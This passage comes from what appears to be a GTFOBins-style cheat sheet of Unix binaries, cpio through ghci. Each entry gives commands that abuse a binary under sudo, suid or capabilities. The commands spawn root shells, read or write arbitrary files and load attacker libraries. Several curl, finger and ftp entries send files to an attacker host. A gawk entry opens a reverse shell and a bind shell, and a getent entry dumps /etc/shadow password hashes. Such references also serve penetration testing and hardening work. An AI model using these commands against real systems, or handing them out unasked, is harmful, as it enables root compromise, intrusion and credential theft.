The whole directory structure is copied to `.`, with the data written to `$tmp_file`.

```sh title:"sudo / suid / unprivileged"
echo $data >$tmp_file
echo $tmp_file | cpio -udp .
```
<!-- cheat
var data
var tmp_file
-->

#### cpio file-write - sudo override

```sh title:"sudo variant"
echo $data >$tmp_file
echo $tmp_file | cpio -R 0:0 -udp .
```
<!-- cheat
var data
var tmp_file
-->

#### cpio file-write - suid override

```sh title:"suid variant"
echo $data >$tmp_file
echo $tmp_file | cpio -R 0:0 -udp .
```
<!-- cheat
var data
var tmp_file
-->

## cpulimit

### cpulimit shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
cpulimit -l 100 -f -- /bin/sh
```
<!-- cheat
-->

#### cpulimit shell - suid override

```sh title:"suid variant"
cpulimit -l 100 -f -- /bin/sh -p
```
<!-- cheat
-->

## crash

### crash command

Execute an arbitrary non-interactive command.

```sh title:"sudo / unprivileged"
CRASHPAGER=$cmd_file crash -h
```
<!-- cheat
var cmd_file
-->

### crash inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
crash -h
```
<!-- cheat
-->

## crontab

### crontab command

This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).

```sh title:"sudo / unprivileged"
crontab -e
```
<!-- cheat
-->

### crontab inherit (inherits from vi)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
crontab -e
```
<!-- cheat
-->

## csh

### csh shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
csh
```
<!-- cheat
-->

#### csh shell - suid override

```sh title:"suid variant"
csh -b
```
<!-- cheat
-->

### csh file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
csh -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

#### csh file-write - suid override

```sh title:"suid variant"
csh -c 'echo $data >$file_out' -b
```
<!-- cheat
var data
var file_out
-->

## csplit

### csplit file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
csplit $file_in 1
cat xx01
```
<!-- cheat
var file_in
-->

### csplit file-write

Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`).

```sh title:"sudo / suid / unprivileged"
echo $data >$tmp_file
csplit -z -b '%doutput-file' $tmp_file 1
```
<!-- cheat
var data
var tmp_file
-->

## csvtool

### csvtool shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
csvtool call '/bin/sh;false' /etc/hosts
```
<!-- cheat
-->

### csvtool file-read

The file is actually parsed and manipulated as CSV.

```sh title:"sudo / suid / unprivileged"
csvtool trim t $file_in
```
<!-- cheat
var file_in
-->

### csvtool file-write

The file is actually parsed and manipulated as CSV.

```sh title:"sudo / suid / unprivileged"
echo $data >$tmp_file
csvtool trim t $tmp_file -o $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

## ctr

### ctr shell

An image must be already present, for example:  ``` ctr images pull docker.io/library/alpine:latest ```

```sh title:"sudo / suid"
ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
```
<!-- cheat
-->

## cupsfilter

### cupsfilter file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
cupsfilter -i application/octet-stream -m application/octet-stream $file_in
```
<!-- cheat
var file_in
-->

## curl

### curl file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
curl file://$file_in
```
<!-- cheat
var file_in
-->

### curl file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data >$tmp_file
curl file://$tmp_file -o $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### curl download

Pull a remote file to disk.

```sh title:"sudo / suid / unprivileged"
curl $scheme://$lhost$file_in -o $file_out
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### curl upload #1

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
curl -X POST --data-binary @$file_in $scheme://$lhost
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### curl upload #2

Push a local file to a remote receiver.

```sh title:"sudo / suid / unprivileged"
curl -X POST --data-binary $data $scheme://$lhost
```
<!-- cheat
import tun_ip
import scheme
var data
-->

### curl upload #3

Data will be `\r\n` terminated.

```sh title:"sudo / suid / unprivileged"
curl gopher://$lhost:$lport/_DATA
```
<!-- cheat
import tun_ip
import lports
-->

### curl library-load

Load an attacker-supplied shared library.

```sh title:"sudo / suid / unprivileged"
curl --engine $lib x
```
<!-- cheat
var lib
-->

## cut

### cut file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
cut -d '' -f1 $file_in
```
<!-- cheat
var file_in
-->

## dash

### dash shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
dash
```
<!-- cheat
-->

### dash file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
dash -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

## date

### date file-read

Each line is corrupted by a prefix string and wrapped inside quotes.

```sh title:"sudo / suid / unprivileged"
date -f $file_in
```
<!-- cheat
var file_in
-->

## dc

### dc shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
dc -e '!/bin/sh'
```
<!-- cheat
-->

## dd

### dd file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
dd if=$file_in
```
<!-- cheat
var file_in
-->

### dd file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
echo $data | dd of=$file_out
```
<!-- cheat
var data
var file_out
-->

## debugfs

### debugfs shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
debugfs
!/bin/sh
```
<!-- cheat
-->

## dhclient

### dhclient shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
dhclient -sf /bin/sh
```
<!-- cheat
-->

## dialog

### dialog file-read

The file is shown in an interactive TUI dialog.

```sh title:"sudo / suid / unprivileged"
dialog --textbox $file_in 0 0
```
<!-- cheat
var file_in
-->

## diff

### diff file-read #1

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
diff --line-format=%L /dev/null $file_in
```
<!-- cheat
var file_in
-->

### diff file-read #2

This lists the content of a directory. `$dir_empty` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.

```sh title:"sudo / suid / unprivileged"
diff --recursive $dir_empty $dir_in/
```
<!-- cheat
var dir_empty
var dir_in
-->

## dig

### dig file-read

Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation.

```sh title:"sudo / suid / unprivileged"
dig -f $file_in
```
<!-- cheat
var file_in
-->

## distcc

### distcc shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
distcc /bin/sh
```
<!-- cheat
-->

#### distcc shell - suid override

```sh title:"suid variant"
distcc /bin/sh -p
```
<!-- cheat
-->

## dmesg

### dmesg file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
dmesg -rF $file_in
```
<!-- cheat
var file_in
-->

### dmesg inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
dmesg -H
```
<!-- cheat
-->

## dmidecode

### dmidecode file-write

It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode. Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.  - `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.  - `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.  ``` make dmiwrite echo $data >$tmp_file ./dmiwrite $tmp_file x.dmi ```

```sh title:"unprivileged"
dmidecode --no-sysfs -d x.dmi --dump-bin $file_out
```
<!-- cheat
var file_out
-->

## dmsetup

### dmsetup shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'
```
<!-- cheat
-->

#### dmsetup shell - suid override

```sh title:"suid variant"
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -p -s'
```
<!-- cheat
-->

## dnf

### dnf command

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ```  The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.

```sh title:"sudo"
dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
```
<!-- cheat
-->

## dnsmasq

### dnsmasq command

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
dnsmasq --conf-script='$cmd_file 1>&2'
```
<!-- cheat
var cmd_file
-->

## doas

### doas shell

The user must be allowed to use `doas`.

```sh title:"sudo / unprivileged"
doas -u root /bin/sh
```
<!-- cheat
-->

## docker

This requires the user to be privileged enough to run `docker`, e.g., being in the `docker` group or being `root`.

### docker shell #1

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```
<!-- cheat
-->

### docker shell #2

This exploits the fact that is run with the `--privileged` option to directly mount a host's disk, e.g., `/dev/sda1`.

```sh title:"sudo / suid / unprivileged"
docker run --rm -it --privileged -u root alpine
mount /dev/sda1 /mnt/
ls -la /mnt/
chroot /mnt /bin/bash
```
<!-- cheat
-->

### docker file-read

Read a file by copying it to a temporary container (`$CONTAINER_ID`) and back to a new location on the host.

```sh title:"sudo / suid / unprivileged"
docker cp $file_in $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file $tmp_file
cat $tmp_file
```
<!-- cheat
var file_in
var tmp_file
var CONTAINER_ID
-->

### docker file-write

Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.

```sh title:"sudo / suid / unprivileged"
echo $data >$tmp_file
docker cp $tmp_file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
var CONTAINER_ID
-->

## dos2unix

### dos2unix file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
dos2unix -f -O $file_in
```
<!-- cheat
var file_in
-->

### dos2unix file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
dos2unix -f -n $file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

## dosbox

Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.

### dosbox file-read #1

The file content will be displayed in the DOSBox graphical window.

```sh title:"sudo / suid / unprivileged"
dosbox -c 'mount c /' -c 'type c:\path\to\input'
```
<!-- cheat
-->

### dosbox file-read #2

The file is copied to a readable location.

```sh title:"sudo / suid / unprivileged"
dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat $file_out
```
<!-- cheat
var file_out
-->

### dosbox file-write

Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.

```sh title:"sudo / suid / unprivileged"
dosbox -c 'mount c /' -c "echo $data >c:\path\to\output" -c exit
```
<!-- cheat
var data
-->

## dotnet

### dotnet shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
```
<!-- cheat
-->

### dotnet file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
dotnet fsi
System.IO.File.ReadAllText("$file_in");;
```
<!-- cheat
var file_in
-->

## dpkg

### dpkg shell

Generate the Debian package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo 'exec /bin/sh' >x.sh fpm -n x -s dir -t deb -a all --before-install x.sh . ```

```sh title:"sudo"
dpkg -i x_1.0_all.deb
```
<!-- cheat
-->

### dpkg inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
dpkg -l
```
<!-- cheat
-->

## dstat

### dstat inherit (inherits from python)

`dstat` allows you to run arbitrary Python scripts loaded as "external plugins" if they are located in one of the directories, stated in the `dstat` man page under "FILES":  - `~/.dstat/` - `(path of binary)/plugins/` - `/usr/share/dstat/` - `/usr/local/share/dstat/`  Pick the one that you can write into. The plugin named `xxx` file name must be defined in the `dstat_xxx.py` file.

```sh title:"sudo / unprivileged"
dstat --xxx
```
<!-- cheat
-->

## dvips

### dvips shell

The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.  ``` tex '\special{psfile="`/bin/sh 1>&0"}\end' ```

```sh title:"sudo / suid / unprivileged"
dvips -R0 texput.dvi
```
<!-- cheat
-->

## easy_install

### easy_install inherit (inherits from python)

This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).  Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:  ``` echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py ```

```sh title:"sudo / unprivileged"
echo '...' >setup.py
easy_install .
```
<!-- cheat
-->

## easyrsa

### easyrsa shell

This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.

```sh title:"sudo / suid / unprivileged"
echo 'set_var X "$(/bin/sh 1>&0)"' >$tmp_file
easyrsa --vars=$tmp_file
```
<!-- cheat
var tmp_file
-->

## eb

For this to work the target must be connected to an AWS instance via EB CLI.

### eb inherit (inherits from journalctl)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
eb logs
```
<!-- cheat
-->

## ed

### ed shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ed
!/bin/sh
q
```
<!-- cheat
-->

### ed file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
ed $file_in
,p
q
```
<!-- cheat
var file_in
-->

### ed file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
ed $file_out
a
$data
.
w
q
```
<!-- cheat
var data
var file_out
-->

## efax

### efax file-read

The content is actually parsed by the command.

```sh title:"sudo / suid"
efax -d $file_in
```
<!-- cheat
var file_in
-->

## egrep

### egrep file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
grep '' $file_in
```
<!-- cheat
var file_in
-->

## elvish

### elvish shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
elvish
```
<!-- cheat
-->

### elvish file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
elvish -c 'print (slurp <$file_in)'
```
<!-- cheat
var file_in
-->

### elvish file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
elvish -c 'print $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

## emacs

All the functions operate in the Emacs terminal interface.

### emacs shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
emacs -Q -nw --eval '(term "/bin/sh")'
```
<!-- cheat
-->

### emacs file-read

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
emacs $file_in
```
<!-- cheat
var file_in
-->

### emacs file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / unprivileged"
emacs $file_out
$data
C-x C-s
```
<!-- cheat
var data
var file_out
-->

## enscript

### enscript shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
```
<!-- cheat
-->

## env

### env shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
env /bin/sh
```
<!-- cheat
-->

#### env shell - suid override

```sh title:"suid variant"
env /bin/sh -p
```
<!-- cheat
-->

## eqn

### eqn file-read

The content is actually parsed and corrupted by the command.

```sh title:"sudo / suid / unprivileged"
eqn $file_in
```
<!-- cheat
var file_in
-->

## espeak

### espeak file-read

The file content appears in the middle of other textual information as phonemes.

```sh title:"sudo / suid / unprivileged"
espeak -qXf $file_in
```
<!-- cheat
var file_in
-->

## ex

### ex shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ex -c ':!/bin/sh'
```
<!-- cheat
-->

### ex inherit (inherits from ed)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
ex
```
<!-- cheat
-->

## exiftool

### exiftool file-read

If the permissions allow it, files are moved (instead of copied) to the destination.

```sh title:"sudo / unprivileged"
exiftool -filename=$file_out $file_in
cat $file_out
```
<!-- cheat
var file_in
var file_out
-->

### exiftool file-write #1

If the permissions allow it, files are moved (instead of copied) to the destination.

```sh title:"sudo / unprivileged"
exiftool -filename=$file_out $file_in
```
<!-- cheat
var file_in
var file_out
-->

### exiftool file-write #2

The output file must exists, either empty or be a supported image file. The content is written amidst other content.

```sh title:"sudo / unprivileged"
exiftool "-description<=$file_in --filename $file_out
```
<!-- cheat
var file_in
var file_out
-->

### exiftool file-write #3

The output file must exists, either empty or be a supported image file. The content is written amidst other content.

```sh title:"sudo / unprivileged"
exiftool "-description=$data --filename $file_out
```
<!-- cheat
var data
var file_out
-->

### exiftool file-write #4

Writes the metadata tags of the input file in textual format to the output.

```sh title:"sudo / unprivileged"
exiftool -description -W $file_out --filename $file_in
```
<!-- cheat
var file_in
var file_out
-->

### exiftool inherit (inherits from perl)

This allows to run Perl code (`...`).

```sh title:"sudo / unprivileged"
exiftool -if '...' /etc/passwd
```
<!-- cheat
-->

## expand

### expand file-read

The read file content is corrupted by replacing tabs with spaces.

```sh title:"sudo / suid / unprivileged"
expand $file_in
```
<!-- cheat
var file_in
-->

## expect

### expect shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
expect -c 'spawn /bin/sh;interact'
```
<!-- cheat
-->

#### expect shell - suid override

```sh title:"suid variant"
expect -c 'spawn /bin/sh -p;interact'
```
<!-- cheat
-->

### expect file-read

The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message.

```sh title:"sudo / suid / unprivileged"
expect $file_in
```
<!-- cheat
var file_in
-->

## facter

### facter inherit #1 (inherits from ruby)

The first `.rb` file in the `$dir/` directory will be executed.

```sh title:"sudo / unprivileged"
FACTERLIB=$dir/ facter
```
<!-- cheat
var dir
-->

### facter inherit #2 (inherits from ruby)

The first `.rb` file in the `$dir/` directory will be executed.

```sh title:"sudo / unprivileged"
facter --custom-dir=$dir/ x
```
<!-- cheat
var dir
-->

## fail2ban-client

### fail2ban-client command #1

The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.

```sh title:"sudo"
fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban $cmd_file
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x
```
<!-- cheat
var cmd_file
-->

### fail2ban-client command #2

Execute an arbitrary non-interactive command.

```sh title:"sudo"
cat >$tmp_dir/fail2ban.conf <<EOF
[Definition]
EOF

cat >$tmp_dir/jail.local <<EOF
[x]
enabled = true
action = x
EOF

mkdir -p $tmp_dir/action.d/
cat >$tmp_dir/action.d/x.conf <<EOF
[Definition]
actionstart = $cmd_file
EOF

mkdir -p $tmp_dir/filter.d/
cat >$tmp_dir/filter.d/x.conf <<EOF
[Definition]
EOF

fail2ban-client -c $tmp_dir/ -v restart
```
<!-- cheat
var cmd_file
var tmp_dir
-->

## fastfetch

### fastfetch shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
echo '{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}' >$tmp_file
fastfetch -c $tmp_file
```
<!-- cheat
var tmp_file
-->

### fastfetch command

Execute an arbitrary non-interactive command.

```sh title:"sudo / suid / unprivileged"
echo '{"modules":[{"type":"command","key":"x","text":"exec $cmd_file"}]}' >$tmp_file
fastfetch -c $tmp_file
```
<!-- cheat
var cmd_file
var tmp_file
-->

### fastfetch file-read

The file content is used as the logo while some other information is displayed on its right.

```sh title:"sudo / suid / unprivileged"
fastfetch --file $file_in
```
<!-- cheat
var file_in
-->

## ffmpeg

### ffmpeg library-load

Load an attacker-supplied shared library.

```sh title:"sudo / suid / unprivileged"
ffmpeg -f lavfi -i anullsrc -af ladspa=file=$lib $tmp_file
reset^J
```
<!-- cheat
var lib
var tmp_file
-->

## fgrep

### fgrep file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
grep '' $file_in
```
<!-- cheat
var file_in
-->

## file

### file file-read #1

Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation.

```sh title:"sudo / suid / unprivileged"
file -f $file_in
```
<!-- cheat
var file_in
-->

### file file-read #2

Each line is corrupted by a prefix string and wrapped inside quotes.  If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.  It can also be provided with a directory and will read each file in the directory.

```sh title:"sudo / suid / unprivileged"
file -m $file_in
```
<!-- cheat
var file_in
-->

## find

### find shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
find . -exec /bin/sh \; -quit
```
<!-- cheat
-->

#### find shell - suid override

```sh title:"suid variant"
find . -exec /bin/sh -p \; -quit
```
<!-- cheat
-->

### find file-read

This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.

```sh title:"sudo / suid / unprivileged"
find $file_in -exec cat {} \;
```
<!-- cheat
var file_in
-->

### find file-write

`$data` is a format string, it supports some escape sequences.

```sh title:"sudo / suid / unprivileged"
find / -fprintf $file_out $data -quit
```
<!-- cheat
var data
var file_out
-->

## finger

### finger download

The command hangs waiting for the remote peer to close the socket.

```sh title:"sudo / suid / unprivileged"
finger x@$lhost
```
<!-- cheat
import tun_ip
-->

### finger upload

The command hangs waiting for the remote peer to close the socket.

```sh title:"sudo / suid / unprivileged"
finger $data@$lhost
```
<!-- cheat
import tun_ip
var data
-->

## firejail

### firejail shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
firejail /bin/sh
```
<!-- cheat
-->

## fish

### fish shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
fish
```
<!-- cheat
-->

## flock

### flock shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
flock -u / /bin/sh
```
<!-- cheat
-->

#### flock shell - suid override

```sh title:"suid variant"
flock -u / /bin/sh -p
```
<!-- cheat
-->

## fmt

### fmt file-read #1

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
fmt -pNON_EXISTING_PREFIX $file_in
```
<!-- cheat
var file_in
-->

### fmt file-read #2

This corrupts the output by wrapping very long lines at the given width (`999`).

```sh title:"sudo / suid / unprivileged"
fmt -999 $file_in
```
<!-- cheat
var file_in
-->

## fold

### fold file-read

This corrupts the output by wrapping very long lines at the given width (`999`).

```sh title:"sudo / suid / unprivileged"
fold -w999 $file_in
```
<!-- cheat
var file_in
-->

## forge

### forge shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
echo '#!/bin/sh' >$tmp_file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>$tmp_file
chmod +x $tmp_file
forge build --use $tmp_file
```
<!-- cheat
var tmp_file
-->

## fping

### fping file-read

Each line is treated as an hostname and it's leaked as an error message.

```sh title:"sudo / suid / unprivileged"
fping -f $file_in
```
<!-- cheat
var file_in
-->

## ftp

### ftp shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
ftp
!/bin/sh
```
<!-- cheat
-->

### ftp download

Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.

```sh title:"sudo / suid / unprivileged"
ftp -a $lhost
get $file_in output-file
```
<!-- cheat
import tun_ip
var file_in
-->

### ftp upload

Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.

```sh title:"sudo / suid / unprivileged"
ftp -a $lhost
put $file_in output-file
```
<!-- cheat
import tun_ip
var file_in
-->

## fzf

### fzf shell

Press `Enter` to receive the shell.

```sh title:"sudo / suid / unprivileged"
fzf --bind 'enter:execute(/bin/sh)'
```
<!-- cheat
-->

### fzf command

Commands can be issued via POST requests, for example:  ``` curl http://localhost:$lport -d 'execute($cmd_file)' ```

```sh title:"sudo / suid / unprivileged"
fzf --listen=$lport
```
<!-- cheat
import lports
-->

## g++

Alias of [gcc](#gcc). All techniques from `gcc` apply.

## gawk

### gawk shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
gawk 'BEGIN {system("/bin/sh")}'
```
<!-- cheat
-->

### gawk reverse-shell

Connect back to an attacker-controlled listener.

```sh title:"sudo / suid / unprivileged"
gawk 'BEGIN {
    s = "/inet/tcp/0/$lhost/$lport";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```
<!-- cheat
import tun_ip
import lports
-->

### gawk bind-shell

Bind a shell to a local port for the attacker to connect to.

```sh title:"sudo / suid / unprivileged"
gawk 'BEGIN {
    s = "/inet/tcp/$lport/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```
<!-- cheat
import lports
-->

### gawk file-read

Read the contents of an arbitrary file.

```sh title:"sudo / suid / unprivileged"
gawk '//' $file_in
```
<!-- cheat
var file_in
-->

### gawk file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
gawk 'BEGIN { print "$data" > "$file_out" }'
```
<!-- cheat
var data
var file_out
-->

## gcc

### gcc shell

In some older versions, the `x` argument must instead reference any existing file.

```sh title:"sudo / unprivileged"
gcc -wrapper /bin/sh,-s x
```
<!-- cheat
-->

### gcc file-read #1

Read the contents of an arbitrary file.

```sh title:"sudo / unprivileged"
gcc -x c -E $file_in
```
<!-- cheat
var file_in
-->

### gcc file-read #2

The file is read and parsed as a list of files (one per line), the content is displayed as error messages.

```sh title:"sudo / unprivileged"
gcc @$file_in
```
<!-- cheat
var file_in
-->

### gcc file-write

This actually deletes the file.

```sh title:"sudo / unprivileged"
gcc -x c /dev/null -o $file_in
```
<!-- cheat
var file_in
-->

## gcloud

### gcloud inherit (inherits from less)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / suid / unprivileged"
gcloud help
```
<!-- cheat
-->

## gcore

### gcore file-read

It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.

```sh title:"sudo / suid / unprivileged"
gcore $PID
```
<!-- cheat
var PID
-->

## gdb

### gdb shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"capabilities / sudo / suid / unprivileged"
gdb -nx -ex '!/bin/sh' -ex quit
```
<!-- cheat
-->

#### gdb shell - capabilities override

```sh title:"capabilities variant"
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
```
<!-- cheat
-->

### gdb file-write

Write attacker-controlled data to an arbitrary path.

```sh title:"sudo / suid / unprivileged"
gdb -nx -ex 'dump value $file_out "$data"' -ex quit
```
<!-- cheat
var data
var file_out
-->

### gdb inherit (inherits from python)

This allows to run Python code (`...`).

```sh title:"sudo / suid / unprivileged"
gdb -nx -ex 'python ...' -ex quit
```
<!-- cheat
-->

## gem

### gem shell

This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.

```sh title:"sudo / unprivileged"
gem open -e '/bin/sh -s' debug
```
<!-- cheat
-->

### gem inherit #1 (inherits from vi)

This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.

```sh title:"sudo / unprivileged"
gem open debug
```
<!-- cheat
-->

### gem inherit #2 (inherits from ruby)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
gem build $script
```
<!-- cheat
var script
-->

### gem inherit #3 (inherits from ruby)

Inherit the capabilities of another binary by invoking it.

```sh title:"sudo / unprivileged"
gem install --file $script
```
<!-- cheat
var script
-->

## genie

### genie shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / suid / unprivileged"
genie -c '/bin/sh'
```
<!-- cheat
-->

## genisoimage

### genisoimage file-read #1

The output is placed inside the ISO9660 file system binary format, it can be mounted or extracted with tools like `7z`.

```sh title:"sudo / suid / unprivileged"
genisoimage -q -o - $file_in
```
<!-- cheat
var file_in
-->

### genisoimage file-read #2

The file is parsed, and some of its content is disclosed by the error messages.

```sh title:"sudo / suid / unprivileged"
genisoimage -sort $file_in
```
<!-- cheat
var file_in
-->

## getent

### getent privilege-escalation

This allows to dump password hashes from the `/etc/shadow` file.

```sh title:"sudo / suid"
getent shadow
```
<!-- cheat
-->

## ghc

### ghc shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
ghc -e 'System.Process.callCommand "/bin/sh"'
```
<!-- cheat
-->

## ghci

### ghci shell

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"sudo / unprivileged"
ghci
System.Process.callCommand "/bin/sh"
```
<!-- cheat
